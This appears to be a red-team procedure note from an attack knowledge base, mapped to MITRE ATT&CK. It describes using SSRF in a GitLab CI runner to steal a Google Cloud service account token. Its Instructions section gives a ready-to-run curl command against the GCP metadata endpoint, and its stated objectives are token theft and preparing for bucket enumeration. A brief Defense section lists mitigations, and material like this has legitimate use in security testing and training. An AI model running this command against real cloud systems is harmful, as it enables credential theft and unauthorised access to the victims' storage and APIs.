---
id: proc-uuid-4
tags:
  - token-theft
  - gcp
  - metadata
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-obtain-gcp-token]]'
verified: false
platforms:
  - GCP
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T03:46:09.556Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Obtain-GCP-Service-Account-Token-via-Metadata

## Summary

Use SSRF access to query the Google Cloud metadata service and retrieve a default service account access token for further API exploitation.

## Description

With SSRF enabled, curl the internal Google metadata endpoint with the Metadata-Flavor header to obtain the token. This token grants scopes like devstorage.read_only, allowing access to storage buckets in the GitLab CI environment.

## Requirements

1. SSRF access via CI re-run
2. Runner on GCP Compute Engine
3. curl available in the Docker image

## Defense

- Disable metadata service access from CI runners
- Use workload identity federation instead of default service accounts
- Monitor for unauthorized token requests in GCP logs

## Objectives

1. Steal service account token
2. Enable API access to GCP resources
3. Prepare for bucket enumeration

## Instructions

### Step 1: Curl Metadata for Token

**Context**: Request the token from the instance metadata service.

**Command** ([[commands/curl-obtain-gcp-token]]):
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

> Expected output: JSON with access_token, expires_in, and token_type.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Steal Application Access Token]]

### Sub-Techniques


## Commands Used

- [[commands/curl-obtain-gcp-token]]

## Tools Used

- [[tools/curl]]

## Tags

- token-theft
- gcp
